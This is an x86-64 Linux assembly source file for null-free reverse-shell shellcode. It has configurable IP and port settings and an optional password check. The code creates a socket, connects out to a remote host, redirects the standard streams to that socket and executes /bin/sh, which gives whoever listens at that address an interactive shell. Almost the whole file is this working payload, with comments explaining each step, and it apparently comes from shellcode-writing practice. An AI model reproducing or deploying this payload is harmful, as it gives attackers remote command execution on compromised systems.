BITS 64
global _start
section .text

; settings
;%define     USEPASSWORD     ; comment this to not require password
PASSWORD    equ 'Z~r0'      ; cmp dword (SEGFAULT on fail; no bruteforce/cracking/etc.)
;IP          equ 0x0100007f  ; default 127.0.0.1, contains nulls so will need mask
IP          equ 0xffffffff
PORT        equ 0x5c11      ; default 4444

; change the null-free mask as needed
;%define NULLFREE_MASK   0x02010102           ; comment this out if no .0. in IP, save 8 bytes

%ifdef NULLFREE_MASK
%define NULLFREE_IP     IP - NULLFREE_MASK
%else
%define NULLFREE_IP     IP
%endif

; syscall kernel opcodes
SYS_SOCKET  equ 0x29
SYS_CONNECT equ 0x2a
SYS_DUP2    equ 0x21
SYS_EXECVE  equ 0x3b

; argument constants
AF_INET     equ 0x2
SOCK_STREAM equ 0x1

_start:
; High level psuedo-C overview of shellcode logic:
;
; sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
; IP = NULLFREE_IP + NULLFREE_MASK
; struct sockaddr = {AF_INET; [PORT; IP; 0x0]}
;
; connect(sockfd, &sockaddr, 16)
; 
; read(sockfd, *pwbuf, 16)  /* 16 > 4 */
; if (pwbuf != PASSWORD) goto drop
;
; dup2(sockfd, STDIN+STDOUT+STDERR)
; execve("/bin/sh", NULL, NULL)

create_sock:
    ; sockfd = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; syscall number 41 

    push   SYS_SOCKET
    pop    rax
    cdq                     ; rdx = IPPROTO_IP (int: 0)
    push   AF_INET
    pop    rdi
    push   SOCK_STREAM
    pop    rsi
    syscall

    ; copy socket descriptor to rdi for future use 

    push rax
    pop rdi

struct_sockaddr:  
    ; server.sin_family = AF_INET 
    ; server.sin_port = htons(PORT)
    ; server.sin_addr.s_addr = inet_addr("127.0.0.1")
    ; bzero(&server.sin_zero, 8)

    ;push rdx
    push rdx

    mov dword [rsp + 0x4], NULLFREE_IP

%ifdef NULLFREE_MASK
    add dword [rsp + 0x4], NULLFREE_MASK
%endif

    mov word [rsp + 0x2], PORT
    mov byte [rsp], AF_INET

connect_sock:
    ; connect(sockfd, (struct sockaddr *)&server, sockaddr_len)

    push rsp
    pop rsi

    push 0x10
    pop rdx

    push SYS_CONNECT
    pop rax
    syscall


%ifdef USEPASSWORD
password_check:
    ; password = read(sockfd, *buf, 4)

                                    ; rsi = &buf (char*)
                                    ; rdx = 0x10, >4 bytes

    xor eax, eax                    ; SYS_READ = 0x0
    syscall

    cmp dword [rsp], PASSWORD       ; simple comparison
    jne drop                        ; bad pw, abort
%endif

dupe_sockets:
    ; dup2(sockfd, STDIN)
    ; dup2(sockfd, STDOUT)
    ; dup2(sockfd, STERR)
    
    push 0x3                ; loop down file descriptors for I/O
    pop rsi
    
dupe_loop:
    dec esi
    mov al, SYS_DUP2
    syscall
    
    jne dupe_loop

exec_shell:
    ; execve('//bin/sh', NULL, NULL)
    
    push rsi                    ; *argv[] = 0
    pop rdx                     ; *envp[] = 0

    push rsi                    ; '\0'
    mov rdi, '//bin/sh'         ; str
    push rdi            
    push rsp            
    pop rdi                     ; rdi = &str (char*)

    mov al, SYS_EXECVE          ; we fork with this syscall
    syscall

drop:
    ; password check failed, crash program with BADINSTR/SEGFAULT
 
